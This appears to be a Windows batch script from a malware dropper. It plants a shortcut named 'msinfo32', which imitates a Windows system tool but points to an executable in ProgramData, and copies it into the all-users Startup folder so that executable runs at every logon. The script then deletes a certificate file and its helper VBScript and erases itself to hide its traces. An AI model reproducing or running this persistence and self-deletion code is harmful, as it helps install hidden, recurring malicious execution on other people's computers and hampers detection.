@ECHO OFF
SETLOCAL ENABLEDELAYEDEXPANSION
SET LinkName=msinfo32
SET Esc_LinkDest=%%HOMEDRIVE%%%%HOMEPATH%%\Documents\!LinkName!.lnk
SET Esc_LinkTarget=%%HOMEDRIVE%%\ProgramData\msinfo32\msinfo32.exe
SET cSctVBS=CreateShortcut.vbs
SET LOG=".\%~N0_runtime.log"
((
  echo Set oWS = WScript.CreateObject^("WScript.Shell"^) 
  echo sLinkFile = oWS.ExpandEnvironmentStrings^("!Esc_LinkDest!"^)
  echo Set oLink = oWS.CreateShortcut^(sLinkFile^) 
  echo oLink.TargetPath = oWS.ExpandEnvironmentStrings^("!Esc_LinkTarget!"^)
  echo oLink.Save
)1>!cSctVBS!
cscript //nologo .\!cSctVBS!

timeout /t 3 /nobreak >nul

COPY %HOMEDRIVE%%HOMEPATH%\Documents\msinfo32.lnk "%HOMEDRIVE%\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
DEL %HOMEDRIVE%%HOMEPATH%\Documents\msinfo32.lnk
DEL "C:\ProgramData\msinfo32\cert64.crt"

timeout /t 2 /nobreak >nul

DEL !cSctVBS! /f /q
)1>>!LOG! 2>>&1
(goto) 2>nul & del "%~f0"
